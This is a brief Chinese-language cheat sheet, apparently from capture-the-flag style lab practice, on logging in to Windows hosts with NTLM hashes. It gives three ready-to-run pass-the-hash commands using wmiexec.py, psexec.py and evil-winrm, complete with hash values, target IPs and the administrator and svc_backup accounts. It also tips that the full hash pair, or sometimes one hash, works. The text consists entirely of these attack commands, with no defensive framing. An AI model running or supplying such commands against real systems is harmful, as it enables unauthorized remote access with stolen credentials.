# hash凭据登陆

注意是整段hash，两个hash都放进来，一个有时候也行，都试试

```clike
wmiexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff' -dc-ip 10.10.10.175 administrator@10.10.10.175
或者
psexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff' -dc-ip 10.10.10.175 administrator@10.10.10.175
或者
evil-winrm -i 10.129.13.243 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
```
